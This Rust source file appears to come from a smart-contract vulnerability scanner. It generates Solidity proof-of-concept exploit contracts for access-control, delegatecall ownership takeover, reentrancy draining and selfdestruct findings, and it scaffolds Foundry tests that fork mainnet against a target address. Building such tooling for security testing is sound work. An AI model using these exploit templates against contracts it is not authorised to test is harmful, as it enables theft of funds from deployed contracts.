use anyhow::Result;
use std::fs;
use crate::scanner::ContractInfo;
use crate::reporter::Finding;

pub struct FoundryPocGenerator;

impl FoundryPocGenerator {
    pub fn new() -> Self {
        Self
    }

    pub fn generate_poc(&self, contract: &ContractInfo, finding: &Finding, output_path: &str) -> Result<()> {
        let template = match finding.id.as_str() {
            "TX_ORIGIN_AUTH" | "AST_UNPROTECTED_FUNCTION" => self.generate_access_control_poc(contract, finding),
            "DELEGATECALL_UNCHECKED" | "AST_DELEGATECALL_IN_FUNCTION" => self.generate_delegatecall_poc(contract, finding),
            "REENTRANCY_PATTERN" | "AST_UNCHECKED_EXTERNAL_CALL" => self.generate_reentrancy_poc(contract, finding),
            "SELFDESTRUCT_ACCESS" | "AST_SELFDESTRUCT_IN_FUNCTION" => self.generate_selfdestruct_poc(contract, finding),
            _ => self.generate_generic_poc(contract, finding),
        };
        fs::write(output_path, template)?;
        Ok(())
    }

    pub fn generate_foundry_project(&self, address: &str, vuln_type: &str, rpc_url: &str) -> Result<String> {
        // Validate address length before slicing
        if address.len() < 8 {
            return Err(anyhow::anyhow!("Address too short: {}", address));
        }
        let dir = format!("foundry-poc-{}", &address[..8]);
        fs::create_dir_all(&dir)?;
        fs::create_dir_all(format!("{}/src", dir))?;
        fs::create_dir_all(format!("{}/test", dir))?;

        let foundry_toml = format!(
            "[profile.default]\nsrc = \"src\"\nout = \"out\"\nlibs = [\"lib\"]\nremappings = []\n\n[rpc_endpoints]\nmainnet = \"{}\"\n",
            rpc_url
        );
        fs::write(format!("{}/foundry.toml", dir), foundry_toml)?;
        fs::write(format!("{}/test/PoC.t.sol", dir), self.generate_foundry_test(address, vuln_type))?;
        fs::write(format!("{}/src/Exploit.sol", dir), self.generate_exploit_contract(address, vuln_type))?;

        Ok(dir)
    }

    fn generate_access_control_poc(&self, contract: &ContractInfo, finding: &Finding) -> String {
        format!(
            r#"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// PoC for Access Control vulnerability
// Target: {} at {}
// Finding: {}

interface ITarget {{
    function vulnerableFunction() external;
}}

contract Exploit {{
    ITarget public target;

    constructor(address _target) {{
        target = ITarget(_target);
    }}

    function exploit() external {{
        target.vulnerableFunction();
    }}
}}
"#,
            contract.name, contract.address, finding.description
        )
    }

    fn generate_delegatecall_poc(&self, contract: &ContractInfo, finding: &Finding) -> String {
        format!(
            r#"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// PoC for Delegatecall vulnerability
// Target: {} at {}
// Finding: {}

contract MaliciousDelegate {{
    address public owner;
    uint256 public value;

    function attack() external {{
        owner = msg.sender;
        value = 1337;
    }}
}}

interface ITarget {{
    function delegateOperation(bytes memory data) external;
}}

contract Exploit {{
    ITarget public target;
    MaliciousDelegate public malicious;

    constructor(address _target) {{
        target = ITarget(_target);
        malicious = new MaliciousDelegate();
    }}

    function exploit() external {{
        bytes memory payload = abi.encodeWithSelector(MaliciousDelegate.attack.selector);
        target.delegateOperation(payload);
    }}
}}
"#,
            contract.name, contract.address, finding.description
        )
    }

    fn generate_reentrancy_poc(&self, contract: &ContractInfo, finding: &Finding) -> String {
        format!(
            r#"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// PoC for Reentrancy vulnerability
// Target: {} at {}
// Finding: {}

interface ITarget {{
    function withdraw() external;
    function deposit() external payable;
}}

contract ReentrancyExploit {{
    ITarget public target;
    uint256 public count;

    constructor(address _target) {{
        target = ITarget(_target);
    }}

    function exploit() external payable {{
        target.deposit{{value: msg.value}}();
        target.withdraw();
    }}

    receive() external payable {{
        if (count < 5) {{
            count++;
            target.withdraw();
        }}
    }}
}}
"#,
            contract.name, contract.address, finding.description
        )
    }

    fn generate_selfdestruct_poc(&self, contract: &ContractInfo, finding: &Finding) -> String {
        format!(
            r#"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// PoC for Selfdestruct vulnerability
// Target: {} at {}
// Finding: {}

interface ITarget {{
    function destroy() external;
}}

contract Exploit {{
    ITarget public target;

    constructor(address _target) {{
        target = ITarget(_target);
    }}

    function exploit() external {{
        target.destroy();
    }}
}}
"#,
            contract.name, contract.address, finding.description
        )
    }

    fn generate_generic_poc(&self, contract: &ContractInfo, finding: &Finding) -> String {
        let refs = finding.references.join(", ");
        format!(
            r#"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Generic PoC Template
// Target: {} at {}
// Vulnerability: {}
// Description: {}
// References: {}

interface ITarget {{
    // TODO: Define target interface
}}

contract Exploit {{
    ITarget public target;

    constructor(address _target) {{
        target = ITarget(_target);
    }}

    function exploit() external {{
        // TODO: Implement exploit based on vulnerability details
    }}
}}
"#,
            contract.name, contract.address, finding.id, finding.description, refs
        )
    }

    fn generate_foundry_test(&self, address: &str, vuln_type: &str) -> String {
        format!(
            r#"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Exploit.sol";

contract PoCTest is Test {{
    address constant TARGET = {};
    Exploit public exploit;

    function setUp() public {{
        vm.createSelectFork("mainnet");
        exploit = new Exploit(TARGET);
    }}

    function test{}() public {{
        vm.recordLogs();
        exploit.exploit();
    }}
}}
"#,
            address,
            self.to_test_name(vuln_type)
        )
    }

    fn generate_exploit_contract(&self, address: &str, vuln_type: &str) -> String {
        format!(
            r#"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Exploit contract for {}
// Vulnerability type: {}

interface ITarget {{
    // TODO: Add function signatures
}}

contract Exploit {{
    ITarget public target = ITarget({});

    function exploit() external {{
        // TODO: Implement exploit logic
    }}
}}
"#,
            address, vuln_type, address
        )
    }

    fn to_test_name(&self, vuln_type: &str) -> String {
        vuln_type
            .split('_')
            .map(|s| {
                let mut chars = s.chars();
                match chars.next() {
                    None => String::new(),
                    Some(f) => f.to_uppercase().collect::<String>() + chars.as_str(),
                }
            })
            .collect()
    }
}
